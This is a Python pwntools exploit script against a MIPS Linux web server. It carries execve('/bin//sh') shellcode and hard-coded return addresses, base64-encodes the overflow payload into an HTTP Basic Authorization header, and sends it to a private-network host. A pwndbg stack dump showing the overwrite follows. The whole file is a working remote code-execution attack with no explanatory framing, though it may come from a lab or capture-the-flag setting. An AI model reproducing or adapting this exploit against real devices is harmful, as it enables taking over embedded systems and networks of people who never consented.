#coding:utf-8

import base64
# import requests
from pwn import *

context.update(arch = 'mips', bits = 32, endian = 'little', os = 'linux')

def exp(host,port):
    sh = remote(host,port=port)
    shellcode  = b""
    shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
    shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
    shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
    shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
    shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
    shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
    shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
    shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
    shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
    shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
    shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
    shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
    pl = p32(0x408006a4)+"AAAA"+"BBBB"+"CCCC"+p32(0x40800794)+p32(0x004b7d88)
    data= shellcode.ljust(0x400,"A")+pl + ":"
    payload = base64.b64encode(data)
    print(payload)
    package = """GET /www/index.html HTTP/1.1\r
Host: 192.168.100.102:38888\r
Authorization: Basic %s\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\r
Connection: close\r

"""  % payload
    log.info("sending payload")
    log.info(package[:0x100])
    
    sh.send(package.encode())
    res = sh.recv()
    log.info(res)
    return

if __name__=="__main__":
    exp("192.168.100.101",38888)

"""
pwndbg> x/20wx 0x408006a4+0x400-0x10
0x40800a94:	0x41414141	0x41414141	0x41414141	0x41414141
0x40800aa4:	0x6d64613a	0x00006e69	0x00000000	0x40800ab8
0x40800ab4:	0x3fdf0fb4	0x004b7d88	0x004a2900	0x004a32d8
0x40800ac4:	0x3fe06200	0x3fe0e010	0x0041fe88	0x004a2900
0x40800ad4:	0x004a32b8	0x3fe06180	0x0047cac0	0x40800ae8

pwndbg> x/20wx 0x408006a4+0x400-0x10
0x40800a94:	0x41414141	0x41414141	0x41414141	0x41414141
0x40800aa4:	0x408006a4	0x00000411	0x00000000	0x41414141
0x40800ab4:	0x6d646100	0x00006e69	0x004a2900	0x004a32d8
0x40800ac4:	0x3fe06200	0x3fe0e010	0x0041fe88	0x004a2900
0x40800ad4:	0x004a32b8	0x3fe06180	0x0047cac0	0x40800ae8
"""